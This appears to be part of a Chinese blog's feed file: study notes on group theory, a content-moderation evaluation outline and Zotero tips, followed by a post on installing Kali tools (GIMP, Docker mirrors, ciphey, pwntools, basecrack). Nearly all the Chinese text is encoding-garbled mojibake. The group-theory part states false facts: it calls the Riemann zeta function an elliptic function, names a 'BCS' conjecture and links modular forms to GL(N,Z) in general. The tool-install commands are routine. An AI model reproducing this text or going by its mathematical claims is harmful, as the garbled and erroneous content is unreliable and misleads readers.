<p>æ‰€è°“ä¸€ä¸ªå›¾æ¡ˆçš„å¯¹ç§°ç¾¤ï¼Œå°±æ˜¯æŠŠæ‰€æœ‰<strong>ä½¿å¾—å®ƒä¿æŒä¸å˜çš„æ‰€æœ‰åŠ¨ä½œç­›é€‰å‡ºæ¥ï¼Œå‡‘æˆä¸€ä¸ªé›†åˆ</strong>ã€‚ä¸éš¾æƒ³è±¡ï¼Œä¸€ä¸ªå¯¹ç§°ç¾¤å¯ä»¥ç”±æŸäº›æœ€åŸºæœ¬çš„åŠ¨ä½œä¸æ–­ç»„åˆè€Œæˆï¼Œè¿™äº›æœ€â€œåŸºæœ¬çš„åŠ¨ä½œâ€å°±æ˜¯å¯¹ç§°ç¾¤çš„ç”Ÿæˆå…ƒã€‚</p>
<img src="/2023/12/31/WeeklyStudy/640-1703226659674-6.jpeg" class="" title="å›¾ç‰‡">

<p>äºŒç»´æ—‹è½¬ç¾¤ï¼ˆäºŒé˜¶æ­£äº¤çŸ©é˜µç¾¤ï¼‰ï¼š </p>
<img src="/2023/12/31/WeeklyStudy/640-1703227271206-15.png" class="" title="å›¾ç‰‡">

<p>çš„å­ç¾¤ã€‚</p>
<h3 id="ç¾¤çš„å®šä¹‰"><a href="#ç¾¤çš„å®šä¹‰" class="headerlink" title="ç¾¤çš„å®šä¹‰"></a>ç¾¤çš„å®šä¹‰</h3><blockquote>
<p>å®šä¹‰ï¼ˆç¾¤ï¼‰ï¼š</p>
<p>ä¸€ä¸ªç¾¤ï¼ˆG, Â·ï¼‰æ˜¯ç”±ä¸€ä¸ªé›†åˆ G å’Œä¸€ä¸ªäºŒå…ƒè¿ç®— Â· æ„æˆçš„æ•°å­¦ç»“æ„ï¼Œæ»¡è¶³ï¼š</p>
<p>å°é—­æ€§ï¼šå¯¹äº G ä¸­ä»»æ„ä¸¤ä¸ªå…ƒç´  aã€bï¼Œa Â· b ä¹Ÿåœ¨ G ä¸­ï¼›</p>
<p>ç»“åˆå¾‹ï¼šå¯¹äº G ä¸­ä»»æ„ä¸¤ä¸ªå…ƒç´  aã€bã€cï¼Œ(a Â· b) Â· c &#x3D; a Â· (b Â· c);</p>
<p>å•ä½å…ƒï¼šå­˜åœ¨ä¸€ä¸ªâ€œå•ä½å…ƒâ€ eï¼Œä½¿å¾—å¯¹ G ä¸­ä»»æ„å…ƒç´  aï¼š e Â· a &#x3D; a Â· e &#x3D; aï¼›</p>
<p>å¯é€†æ€§ï¼šG ä¸­ä»»æ„å…ƒç´  a å­˜åœ¨ä¸€ä¸ªé€†å…ƒ É ï¼ˆè¿™ä¸ªè®°å·å°±æ˜¯æŠŠå­—æ¯ â€˜aâ€™ å€’è¿‡æ¥ï¼‰ï¼Œä½¿å¾— a Â· É &#x3D; É Â· a &#x3D; e.</p>
</blockquote>
<p>è¿™é‡Œçš„äºŒå…ƒè¿ç®— â€œÂ·â€ å¾ˆåƒä¹˜æ³•ï¼Œä½†ä¸ä¸€å®šæ»¡è¶³äº¤æ¢å¾‹ã€‚ä¾‹å¦‚åœ¨æ—‹è½¬ç¾¤ä¾‹å­ä¸­ï¼Œå…ˆæ—‹è½¬å†ç¿»æŠ˜å’Œå…ˆç¿»æŠ˜åœ¨æ—‹è½¬å¾—åˆ°çš„æ•ˆæœä¸åŒï¼å¦‚æœä¸€ä¸ªç¾¤é¢ç›¸è‰¯å¥½ï¼Œç¾¤â€œä¹˜æ³•â€æ°å¥½æ»¡è¶³äº¤æ¢å¾‹ï¼Œé‚£ä¹ˆè¿™æ ·çš„ç¾¤ç§°ä¸ºäº¤æ¢ç¾¤ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/640-1703226795012-9.jpeg" class="" title="å›¾ç‰‡">

<p>ç¾¤çš„å¦ä¸€ä¸ªä¾‹å­å¯¹äºæœ‰çº¿æ€§ä»£æ•°åŸºç¡€çš„è¯»è€…éƒ½ä¸é™Œç”Ÿ â€”â€” æ‰€æœ‰ N é˜¶éå¥‡å¼‚ï¼ˆå¯é€†ï¼‰çŸ©é˜µéƒ½èƒ½å¤Ÿç»„æˆä¸€ä¸ªç¾¤ï¼Œè€Œè¿™ä¸ªç¾¤çš„ä¹˜æ³•å°±æ˜¯çŸ©é˜µä¹˜æ³•ï¼Œå› æ­¤è¿™å¹¶ä¸æ˜¯äº¤æ¢ç¾¤ã€‚æ•°å­¦å®¶ä»¬æŠŠè¿™ä¸ªç¾¤ç§°ä¸º N é˜¶çº¿æ€§ç¾¤ï¼Œè®°ä½œ GL(N,R) ï¼Œè¿™é‡Œ R è¡¨ç¤ºå®æ•°å…¨ä½“</p>
<h4 id="åº”ç”¨1"><a href="#åº”ç”¨1" class="headerlink" title="åº”ç”¨1"></a>åº”ç”¨1</h4><p>ä¾‹å¦‚ GL(N,R) å’Œ GL(N,C) æ˜¯<strong>è¿ç»­ç¾¤</strong>ï¼ŒåŒ…å«äº†ä¸€å¤§ç±»æç¾¤ï¼ˆåŒæ—¶å…·æœ‰ç¾¤å’Œæµå½¢åŒé‡å±æ€§ï¼‰ï¼Œå’Œä¸ä¹‹å¯¹åº”çš„æä»£æ•°ï¼ˆæç¾¤ä¸Šçš„åˆ‡å‘é‡åœºï¼Œå› æç¾¤å…·æœ‰ç¾¤çš„ç‰¹æ€§ä¹ŸåŒæ—¶è¢«èµ‹äºˆäº†ä»£æ•°æ€§è´¨ï¼‰å…³ç³»å¯†åˆ‡ã€‚ç”±ç†è®ºç‰©ç†å­¦ä¸­è‘—åçš„<strong>è¯ºç‰¹å®šç†</strong>ï¼ˆNoetherâ€˜s Theormï¼‰ï¼Œæ¯ç§å®ˆæ’çš„ç‰©ç†é‡ï¼ˆä¾‹å¦‚è´¨é‡ã€åŠ¨é‡ã€èƒ½é‡ç­‰ï¼‰éƒ½å¯¹åº”ä¸€ç§å¯¹ç§°æ€§ [1,2]ï¼Œäºæ˜¯çº¿æ€§ç¾¤å’Œæç¾¤ä¾¿æˆä¸ºäº†ç†è®ºç‰©ç†å­¦ä¸­å¼ºæœ‰åŠ›çš„å·¥å…·ã€‚</p>
<h4 id="åº”ç”¨2"><a href="#åº”ç”¨2" class="headerlink" title="åº”ç”¨2"></a>åº”ç”¨2</h4><p>GL(N,Z) å’Œ GL(N,F_q) éƒ½æ˜¯<strong>ç¦»æ•£ç¾¤</strong>ï¼Œæ€§æ ¼å’Œ GL(N,R) ã€ GL(N,C) ä¸¤å…„å¼Ÿå¤§ä¸ç›¸åŒï¼Œå®ƒä»¬è¢«å¹¿æ³›åœ°è¿ç”¨åœ¨æ•°è®ºç ”ç©¶ä¸­ã€‚ä¾‹å¦‚ GL(N,Z) å’Œæ•°è®ºä¸­è‘—åçš„<strong>æ¨¡å½¢å¼</strong>ï¼ˆModular Formï¼‰å…³ç³»å¯†åˆ‡ã€‚ç®€è€Œè¨€ä¹‹ï¼Œæ•°è®ºä¸­çš„è®¸å¤šé—®é¢˜ï¼Œå°¤å…¶æ˜¯ä¸æ¤­åœ†æ›²çº¿æœ‰å…³çš„é—®é¢˜ï¼Œå¯ä»¥é€šè¿‡ç ”ç©¶<strong>æ¤­åœ†å‡½æ•°</strong>ï¼ˆå¤æ•°åŸŸä¸Šçš„åŒå‘¨æœŸå‡½æ•°ï¼‰æ¥æè¿°å‡ºæ¥ã€‚æ¤­åœ†å‡½æ•°å±äºå¤å˜å‡½æ•°ï¼Œç§ç±»ç¹å¤šï¼Œé€šè¿‡ä¼ ç»Ÿçš„åˆ†ææ–¹æ³•ç ”ç©¶å¹¶ä¸å®¹æ˜“ï¼›æ¨¡å½¢å¼æ˜¯æ¤­åœ†å‡½æ•°çš„ä¸€ç§ç®€å•è¡¨è¾¾æ–¹å¼ï¼Œå®ƒä»¬çš„å¯¹ç§°ç¾¤å°±æ˜¯ GL(N,Z) çš„ä¸€ä¸ª<strong>å­ç¾¤</strong>ï¼ˆSubgroupï¼Œç®€è¦è¯´æ¥å°±æ˜¯åŸç¾¤çš„ä¸€ä¸ªå­é›†åˆï¼Œå¹¶ä¸”è¿™ä¸ªè‡ªå·±å’Œä¹Ÿæ˜¯ä¸€ä¸ªç¾¤ï¼‰ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/640-1703226932612-12.jpeg" class="" title="å›¾ç‰‡">

<p>é€šè¿‡æ¤­åœ†å‡½æ•°çš„å¯¹ç§°ç¾¤æ¥ç ”ç©¶æ¤­åœ†å‡½æ•°æœ¬èº«ï¼Œè¿™ç§å……æ»¡æ–°æ„çš„æƒ³æ³•ä¸ºæ¤­åœ†æ›²çº¿çš„ç ”ç©¶æä¾›äº†å…¨æ–°çš„æ€è·¯ï¼Œå¹¶ä¸”åŒåƒç¦§å¹´æ•°å­¦ä¸ƒå¤§æ•°å­¦éš¾é¢˜ä¸­çš„é»æ›¼å‡è®¾ï¼ˆé»æ›¼zetaå‡½æ•°ä¹Ÿæ˜¯æ¤­åœ†å‡½æ•°ï¼‰å’Œ BCS çŒœæƒ³ä¸¤ä¸ªé—®é¢˜è”ç³»ç´§å¯†ã€‚</p>
<p><strong>ç¾¤æ­£æ˜¯ç ´è§£å¯¹ç§°æ€§çš„åˆ©å™¨ã€‚</strong></p>
<h1 id="231226"><a href="#231226" class="headerlink" title="231226"></a>231226</h1><ol>
<li>ç¡®å®šæµ‹è¯„ç›®æ ‡å’ŒèŒƒå›´ï¼š<ul>
<li>ç¡®å®šæµ‹è¯„çš„æ•´ä½“ç›®æ ‡ï¼Œä¾‹å¦‚æå‡å†…å®¹å®¡æ ¸çš„å‡†ç¡®æ€§å’Œé«˜æ•ˆæ€§ï¼Œç¡®ä¿ç”¨æˆ·å‘å¸ƒçš„å†…å®¹ç¬¦åˆæ³•è§„å’Œå¹³å°è§„å®šã€‚</li>
<li>ç¡®å®šæµ‹è¯„çš„èŒƒå›´ï¼ŒåŒ…æ‹¬å®¡æ ¸è§„åˆ™ã€å®¡æ ¸ä½“ç³»ç»“æ„å’Œä½¿ç”¨çš„å®¡æ ¸å·¥å…·ç­‰ã€‚</li>
</ul>
</li>
<li>åˆ¶å®šæµ‹è¯„æ–¹æ¡ˆï¼š<ul>
<li>è§„åˆ’æµ‹è¯„çš„æ—¶é—´è¡¨å’Œå·¥ä½œæµç¨‹ï¼Œç¡®ä¿æµ‹è¯„å·¥ä½œèƒ½å¤Ÿé¡ºåˆ©è¿›è¡Œï¼Œå¹¶ä¸å½±å“å¹³å°çš„æ­£å¸¸è¿è¥ã€‚</li>
<li>è®¾è®¡æµ‹è¯„çš„æ–¹æ³•å’Œè¯„ä¼°æŒ‡æ ‡ï¼Œç”¨äºå¯¹å†…å®¹å®‰å…¨å®¡æ ¸å·¥ä½œçš„å®æ—¶ç›‘æ§ã€å®¡æ ¸è§„åˆ™çš„è°ƒæ•´ã€å®¡æ ¸ä½“ç³»ç»“æ„çš„è®¾è®¡ç­‰æ–¹é¢è¿›è¡Œè¯„ä¼°ã€‚</li>
</ul>
</li>
<li>ç»„ç»‡å®æ–½æµ‹è¯„å·¥ä½œï¼š<ul>
<li>å®‰æ’å®¡æ ¸å·¥ä½œäººå‘˜è¿›è¡Œæ—¥å¸¸å®¡æ ¸å·¥ä½œï¼Œå¹¶ä½¿ç”¨äº’è”ç½‘ä¿¡æ¯å®¡æ ¸å·¥å…·è¿›è¡Œå®æ—¶ç›‘æ§ï¼ŒåŠæ—¶å‘ç°å’Œå¤„ç†é—®é¢˜ã€‚</li>
<li>æ”¶é›†å®¡æ ¸å·¥ä½œæ•°æ®å’Œå®¡æ ¸ç»“æœï¼ŒåŒ…æ‹¬å®¡æ ¸é€šè¿‡ç‡ã€è¯¯åˆ¤ç‡ã€å®¡æ ¸çš„ç”¨æˆ·åé¦ˆç­‰ã€‚</li>
</ul>
</li>
<li>ä½¿ç”¨äº’è”ç½‘ä¿¡æ¯å®¡æ ¸å·¥å…·å®æ—¶ç›‘æ§å®¡æ ¸å·¥ä½œï¼Œè°ƒæ•´å®¡æ ¸è§„åˆ™ï¼š<ol>
<li>éƒ¨ç½²äº’è”ç½‘ä¿¡æ¯å®¡æ ¸å·¥å…·ï¼Œå¯¹ç”¨æˆ·ç”Ÿæˆçš„å†…å®¹è¿›è¡Œå®æ—¶ç›‘æ§ï¼ŒåŒ…æ‹¬æ–‡æœ¬ã€å›¾ç‰‡ã€è§†é¢‘ç­‰å¤šç§å½¢å¼ã€‚</li>
<li>åˆ†æå®¡æ ¸å·¥ä½œä¸­å‘ç°çš„é—®é¢˜åŠç”¨æˆ·æŠ•è¯‰æƒ…å†µï¼Œä»¥æœŸé—´è°ƒæ•´å®¡æ ¸è§„åˆ™ï¼ŒåŒ…æ‹¬æ•æ„Ÿè¯åº“ã€æ¶‰é»„æ¶‰æš´æ¶‰æ”¿ç­‰è§„åˆ™çš„è°ƒæ•´å’Œä¼˜åŒ–ã€‚</li>
<li>è¿½è¸ªæœ€æ–°çš„ç½‘ç»œçƒ­ç‚¹äº‹ä»¶å’Œèˆ†æƒ…åŠ¨æ€ï¼Œæ›´æ–°å®¡æ ¸è§„åˆ™ä»¥åº”å¯¹çªå‘äº‹ä»¶å’Œèˆ†æƒ…é£é™©ã€‚</li>
</ol>
</li>
<li>æ ¹æ®å®¡æ ¸è§„åˆ™è®¾è®¡äº’è”ç½‘ä¿¡æ¯å®¡æ ¸ä½“ç³»ç»“æ„ï¼Œæå‡ºå·¥ä½œå¼€å‘éœ€æ±‚ï¼š<ol>
<li>æ ¹æ®å®¡æ ¸è§„åˆ™è®¾è®¡å®¡æ ¸æµç¨‹å’Œä½“ç³»ç»“æ„ï¼Œç¡®ä¿å®¡æ ¸å·¥ä½œçš„ä¸¥è°¨æ€§å’ŒæŒç»­æ€§ã€‚åŒ…æ‹¬è´£ä»»äººçš„èŒè´£å’Œæƒé™åˆ’åˆ†ï¼Œå®¡æ ¸æµç¨‹çš„è§„èŒƒåŒ–å’Œé€æ˜åŒ–ã€‚</li>
<li>å¯¹å®¡æ ¸å·¥ä½œçš„æŠ€æœ¯å’Œäººå‘˜éœ€æ±‚è¿›è¡Œè¯„ä¼°ï¼Œæå‡ºåŒ…æ‹¬ç¡¬ä»¶è®¾å¤‡ã€è½¯ä»¶å·¥å…·ã€äººå‘˜åŸ¹è®­ç­‰å·¥ä½œéœ€æ±‚å¹¶æå‡ºç›¸åº”çš„æŠ€æœ¯æ¨èã€‚</li>
</ol>
</li>
<li>æ ¹æ®å·¥ä½œæ±‡æ€»ç»“æœï¼Œè°ƒæ•´å†…å®¹å…³è”æ‹“å±•å®¡æ ¸åˆ¶åº¦ï¼Œè°ƒæ•´äº’è”ç½‘ä¿¡æ¯å®¡æ ¸å·¥å…·ï¼š<ol>
<li>å¯¹å†…å®¹å…³è”æ‹“å±•çš„å®¡æ ¸å·¥ä½œè¿›è¡Œç»©æ•ˆè¯„ä¼°ï¼Œæ ¹æ®å®é™…ç»“æœå¯¹å…³è”æ‹“å±•å®¡æ ¸åˆ¶åº¦è¿›è¡Œè°ƒæ•´ï¼Œä¼˜åŒ–å®¡æ ¸ç­–ç•¥ï¼Œç¡®ä¿å®¡æ ¸çš„å…¨é¢æ€§å’Œå‡†ç¡®æ€§ã€‚</li>
<li>æ ¹æ®æœ€æ–°çš„å®¡æ ¸è§„åˆ™å’Œå®¡æ ¸éœ€æ±‚ï¼Œå¯¹äº’è”ç½‘ä¿¡æ¯å®¡æ ¸å·¥å…·è¿›è¡Œæ›´æ–°å’Œè°ƒæ•´ï¼Œç¡®ä¿å·¥å…·çš„é€‚åº”æ€§å’Œçµæ´»æ€§ã€‚</li>
<li>æå‡ºå…³äºå®¡æ ¸å·¥å…·åŠŸèƒ½è¿­ä»£å’ŒæŠ€æœ¯å‡çº§çš„å·¥ä½œå¼€å‘éœ€æ±‚ï¼Œä»¥é€‚åº”ä¸æ–­å˜åŒ–çš„äº’è”ç½‘å†…å®¹ç‰¹ç‚¹å’Œå®¡æ ¸è¦æ±‚ã€‚</li>
</ol>
</li>
</ol>
<h1 id="231227-8"><a href="#231227-8" class="headerlink" title="231227-8"></a>231227-8</h1><p>Obsidianä»¥åŠZoteroçš„ä½¿ç”¨ã€‚</p>
<p><strong>æ·»åŠ æ–‡çŒ®</strong>ã€‚æ·»åŠ æ–‡çŒ®æ¡ç›®çš„æ–¹å¼æœ‰å¾ˆå¤šï¼Œä¸ªäººè®¤ä¸ºä»¥doiå·æ·»åŠ ã€æµè§ˆå™¨æ’ä»¶ä¸ºä¸»ï¼Œä»¥å‰ªè´´æ¿å¯¼å…¥ä¸ºè¾…ã€‚</p>
<p>(1)é¦–å…ˆåœ¨ç½‘ä¸ŠæŸ¥æ‰¾åˆ°æ–‡çŒ®çš„doiå·ï¼Œç„¶åé€šè¿‡doiå·æ·»åŠ æ¡ç›®ï¼Œzoteroä¼šæœç´¢æ–‡çŒ®ä¿¡æ¯è‡ªåŠ¨æ·»åŠ ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/v2-3516606cbd7704ca97f766c4ff16f741_720w.webp" class="" title="img">

<p>é€šè¿‡doiå·æ·»åŠ æ¡ç›®</p>
<p>(2)é€šè¿‡æµè§ˆå™¨æ’ä»¶æ·»åŠ æ¡ç›®ï¼Œéœ€è¦å€ŸåŠ©zoteroçš„å®˜æ–¹æµè§ˆå™¨æ’ä»¶ï¼Œæ”¯æŒå¤šç§æµè§ˆå™¨ï¼Œå¯ä»¥åœ¨<a href="https://link.zhihu.com/?target=https://www.zotero.org/">zoteroå®˜ç½‘</a>ç›´æ¥å®‰è£…ï¼Œä¹Ÿæ˜¯æˆ‘æ·»åŠ å‚è€ƒæ–‡çŒ®çš„ä¸»è¦æ–¹å¼ã€‚å®‰è£…æ’ä»¶åï¼Œå½“ä½äºæœ‰æ–‡çŒ®ä¿¡æ¯çš„ç½‘é¡µæ—¶ï¼Œä¾‹å¦‚è°·æ­Œå­¦æœ¯ã€çŸ¥ç½‘æˆ–æœŸåˆŠç½‘ç«™ç­‰ç­‰ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡æ’ä»¶å°†å½“å‰æ–‡çŒ®ä¿å­˜åœ¨zoteroï¼Œå¹¶ä¸”æ”¯æŒä¸€æ¬¡æ·»åŠ å¤šç¯‡æ–‡çŒ®ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/v2-aa18d3eca5354163092aaba79dc145f4_720w.webp" class="" title="img">

<p>å®˜ç½‘æä¾›çš„æµè§ˆå™¨æ’ä»¶ï¼Œå³ä¾§ä¸‹è½½å¯¹åº”ç‰ˆæœ¬</p>
<img src="/2023/12/31/WeeklyStudy/v2-8819c08381807e291c6d2877cc79e238_720w.webp" class="" title="img">

<p>ä½¿ç”¨æµè§ˆå™¨æ’ä»¶æ·»åŠ æ¡ç›®</p>
<p>(3)é€šè¿‡å‰ªè´´æ¿å¯¼å…¥ã€‚ä¸Šè¿°ä¸¤ç§æ–¹æ³•åŸºæœ¬å¯ä»¥åº”ä»˜å¤§å¤šæ–‡çŒ®ï¼Œä½†å¯¹äºä¸€äº›ç‰¹åˆ«å¤è€çš„æ–‡çŒ®å¯èƒ½å°±æ²¡æ³•è¯†åˆ«ï¼Œè¿™æ˜¯è¿˜å¯ä»¥é€šè¿‡å‰ªè´´æ¿å¯¼å…¥è¾…åŠ©æ·»åŠ ã€‚æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ç¯‡æ–‡çŒ®çš„å‚è€ƒæ–‡çŒ®ä¿¡æ¯(æˆ–è€…è‡ªå·±æ‰‹åŠ¨æ•´ç†)ï¼Œç„¶åå¤åˆ¶åˆ°å‰ªè´´æ¿ï¼Œç„¶ååœ¨zoteroä¸­é€‰â€æ–‡ä»¶â€-&gt;â€ä»å‰ªè´´æ¿å¯¼å…¥â€æˆ–è€…æŒ‰å¿«æ·é”®â€Ctrl+Shift+Alt+Iâ€æ¥å¯¼å…¥æ–‡çŒ®ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/v2-e41ef0ebe02064298ce26e81dd7d2744_720w.webp" class="" title="img">

<p>ä»å‰ªè´´æ¿å¯¼å…¥æ¡ç›®</p>
<p>ä¸€èˆ¬å¯¼å…¥æ–‡çŒ®ä¹‹åï¼Œå¹¶ä¸èƒ½ä¿è¯æ–‡çŒ®ä¿¡æ¯ä¸€å®šæ˜¯æ­£ç¡®çš„ï¼Œè¿˜éœ€è¦å…»æˆä¸»åŠ¨æ£€æŸ¥çš„ä¹ æƒ¯ã€‚</p>
]]></content>
      <categories>
        <category>Description</category>
      </categories>
      <tags>
        <tag>2023</tag>
      </tags>
  </entry>
  <entry>
    <title>Gimpå®‰è£…-Volä¸€äº›ç”¨æ³•</title>
    <url>/2024/12/05/gimp%E5%AE%89%E8%A3%85-vol%E4%B8%80%E4%BA%9B%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<p>ä¸»è¦æ˜¯ä¸€äº›kaliä¸­å·¥å…·çš„å®‰è£…ï¼Œè¿™äº›å·¥å…·å®‰è£…é€‚ç”¨äº<code>Kali-2024</code>ç‰ˆæœ¬ã€‚</p>
<p>ä¸­é—´æœ‰ä¸€ä¸ªé¢˜ç›®å¤ç°ï¼Œä¸»è¦æ¶‰åŠç”»å›¾éœ€è¦ç”¨<code>gimp</code>çš„åœºæ™¯ã€‚</p>
<span id="more"></span><!--toc-->
<h1>å®‰è£…gimp</h1>
<blockquote>
<p><a href="https://www.gimp.org/">GIMP - GNU Image Manipulation Program</a><br>
<a href="https://www.gimp.org/downloads/">GIMP - Downloads</a></p>
</blockquote>
<p><em>è¿˜å¾—æ˜¯å®˜æ–¹ï¼Œæ¯”è¾ƒå¯é ã€‚</em></p>
<h2 id="å®‰è£…flatpak">å®‰è£…flatpak</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flatpak install https://flathub.org/repo/appstream/org.gimp.GIMP.flatpakref</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥å…ˆè¿›è¡Œå®‰è£…ï¼Œå¯èƒ½éœ€è¦ç¨³å®šç½‘ç»œã€‚<br>
åæ­£å¤šè¯•è¯•ï¼Œæ¯”dockeræ‹‰å–å®¹æ˜“ã€‚<br>
å®‰è£…<code>gimp</code>ç›¸å…³çš„ç¯å¢ƒï¼Œä¸€èˆ¬éœ€è¦æ¯”è¾ƒå¤šçš„æ—¶é—´è¿›è¡Œå®‰è£…ã€‚<br>
ä¸€å…±æ˜¯5/7ä¸ªç¯å¢ƒï¼Œéœ€è¦èŠ±è´¹ä¸€å®šæ—¶é—´ï¼Œå¯èƒ½å®‰è£…å¤±è´¥ã€‚</p>
<h2 id="è¿è¡Œflatpak">è¿è¡Œflatpak</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flatpak run org.gimp.GIMP//stable</span><br></pre></td></tr></table></figure>
<p>å®‰è£…å¤±è´¥ï¼Œç›´æ¥é‡æ–°å®‰è£…å³å¯ã€‚<br>
æ‰“å¼€åŸå§‹æ–‡ä»¶çš„2ç§æ–¹å¼ã€‚</p>
<ul>
<li>ä½¿ç”¨ä¸Šé¢çš„å‘½ä»¤ä¹‹åï¼Œåœ¨å›¾å½¢åŒ–ç•Œé¢ä¸­æ‰“å¼€<code>data</code>æ–‡ä»¶</li>
<li>æˆ–è€…ç›´æ¥ä½¿ç”¨<code>flatpak run org.gimp.GIMP//stable xxx.data</code></li>
</ul>
<h2 id="æ›´æ–°flatpak">æ›´æ–°flatpak</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flatpak update</span><br></pre></td></tr></table></figure>
<p>è¿˜å¤±è´¥çš„è¯å°±æ›´æ–°ä¸‹<code>flatpak</code>ã€‚</p>
<h2 id="dockerå¯åŠ¨å¤±è´¥">dockerå¯åŠ¨å¤±è´¥</h2>
<blockquote>
<p><a href="https://blog.csdn.net/qq_39779233/article/details/142890967">Docker æ‹‰å–é•œåƒæ—¶é…ç½®å¯ç”¨é•œåƒæºï¼ˆåŒ…å«å›½å†…å¯ç”¨é•œåƒæºï¼‰_dockeré•œåƒæº-CSDNåšå®¢</a></p>
</blockquote>
<p>ç±»ä¼¼å¦‚ä¸‹æŠ¥é”™ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status docker.service</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ã— docker.service - Docker Application Container Engine</span><br><span class="line">     Loaded: loaded (/usr/lib/systemd/system/docker.service; enabled; preset: enabled)</span><br><span class="line">     Active: failed (Result: exit-code) since Mon 2024-11-11 01:26:48 EST; 4s ago</span><br><span class="line"> Invocation: a94a14824532421fa127a297e3857f2e</span><br><span class="line">TriggeredBy: Ã— docker.socket</span><br><span class="line">       Docs: https://docs.docker.com</span><br><span class="line">    Process: 21309 ExecStart=/usr/sbin/dockerd -H fd:// --containerd=/run/containerd/c&gt;</span><br><span class="line">   Main PID: 21309 (code=exited, status=1/FAILURE)</span><br><span class="line"></span><br><span class="line">Nov 11 01:26:48 kali systemd[1]: docker.service: Scheduled restart job, restart counte&gt;</span><br><span class="line">Nov 11 01:26:48 kali systemd[1]: docker.service: Start request repeated too quickly.</span><br><span class="line">Nov 11 01:26:48 kali systemd[1]: docker.service: Failed with result &#x27;exit-code&#x27;.</span><br><span class="line">Nov 11 01:26:48 kali systemd[1]: Failed to start docker.service - Docker Application C&gt;</span><br></pre></td></tr></table></figure>
<p>æŠ¥é”™å…³é”®ï¼š<code>Result: exit-code</code><br>
ä¸»è¦ç”±äºä¸€äº›é…ç½®æ–‡ä»¶é”™è¯¯å¯¼è‡´æŠ¥é”™äº†ã€‚</p>
<p>ä¸€èˆ¬å°±ç›´æ¥é’ˆå¯¹é…ç½®æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼š<code>vi /etc/docker/daemon.json</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;registry-mirrors&quot;: [</span><br><span class="line">        &quot;https://docker.1panel.live&quot;,</span><br><span class="line">        &quot;https://hub.rat.dev&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹å®Œæ¯•ä¹‹åï¼Œç›´æ¥ä½¿ç”¨<code>systemctl daemon-reload</code>ï¼Œè¿›è¡Œreload.</p>
<p>ç„¶åé‡å¯dockeræœåŠ¡ã€‚<code>systemctl restart docker</code></p>
<p>æœ€åæŸ¥çœ‹æ˜¯å¦æ¢æºæˆåŠŸã€‚<br>
<code>docker info</code></p>
<h1>å®‰è£…ciphey</h1>
<blockquote>
<p>ä¸»è¦å­˜åœ¨çš„å›°éš¾ç‚¹å°±æ˜¯é•œåƒæºè¢«banæ‰äº†æ‰€ä»¥å¯¼è‡´æ— æ³•ä¸‹è½½ã€‚<br>
è¦ä¹ˆæ¢é•œåƒï¼Œè¦ä¹ˆå°±æ˜¯ç›´æ¥æŒ‚ä»£ç†ï¼Œå®³ã€‚</p>
</blockquote>
<p>åœ¨ä¸Šé¢çš„æ¢æºæ“ä½œæˆåŠŸä¹‹åï¼Œçªç„¶å¯ä»¥å®‰è£…<code>ciphey</code>äº†ï¼Œç¥å¥‡ã€‚</p>
<p><code>docker run -it --rm remnux/ciphey</code><br>
æ²¡æœ‰é•œåƒçš„è¯ï¼Œä¼šè‡ªåŠ¨ç´¢å¼•å¯ä»¥ä¸‹è½½çš„é•œåƒæºï¼Œç„¶åè¿›è¡Œå®‰è£…ã€‚<br>
å®‰è£…å®Œæ¯•ä¹‹åï¼Œå°±å¯ä»¥ç›´æ¥è¿›è¡Œè°ƒç”¨äº†ã€‚</p>
<p>ä¸€èˆ¬è°ƒç”¨ï¼š</p>
<ul>
<li><code>docker run -it --rm remnux/ciphey -t &quot;xxx&quot;</code></li>
<li><code>docker run -it --rm remnux/ciphey -f [filename]</code></li>
</ul>
<h1>å®‰è£…pwntools</h1>
<blockquote>
<p><a href="https://docs.pwntools.com/en/stable/install.html#python3">https://docs.pwntools.com/en/stable/install.html#python3</a></p>
</blockquote>
<p>åŒ…å«python3çš„pwntoolsçš„å®‰è£…ã€‚<br>
æ¶‰åŠåˆ°<a href="kali-pip3%E5%AE%89%E8%A3%85%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83.md">kali-pip3å®‰è£…è™šæ‹Ÿç¯å¢ƒ</a>ä¸­æå‡æƒé™çš„é—®é¢˜ã€‚<br>
ä¸€èˆ¬å®‰è£…ä¸ä¸Šä¸œè¥¿åŸºæœ¬éƒ½æ˜¯å› ä¸ºæƒé™å¤ªä½ï¼Œæˆ–è€…ç›¸å…³ä¾èµ–åº“ç‰ˆæœ¬ä¸å¯¹åº”çš„åŸå› ã€‚</p>
<p>python2å®‰è£…å®˜æ–¹æ–¹æ³•æ— æ³•è¿›è¡Œå®‰è£…ï¼Œæš‚æ—¶æ— æ³•ç†è§£å¦‚ä½•è¿›è¡Œå¤„ç†ã€‚<br>
å…ˆæ”¾ç€ã€‚</p>
<h1>å®‰è£…basecrack</h1>
<p>ä¸‹è½½å·¥å…·ï¼š<a href="https://github.com/mufeedvh/basecrack">https://github.com/mufeedvh/basecrack</a><br>
ä¸‹è½½å¥½åŒ…ä¹‹åå°±å¯ä»¥ç›´æ¥è¿›å…¥åˆ°ç›®å½•ä¹‹åä½¿ç”¨<code>pip install -r requirements.txt</code>è¿›è¡Œå®‰è£…ã€‚</p>
<p>å¯èƒ½å‡ºç°é—®é¢˜çš„ä¸»è¦åœ¨è·Ÿè™šæ‹Ÿç¯å¢ƒè”åˆçš„æ—¶å€™ï¼š</p>
<ul>
<li>å…ˆè¿›å…¥åˆ°è™šæ‹Ÿç¯å¢ƒ</li>
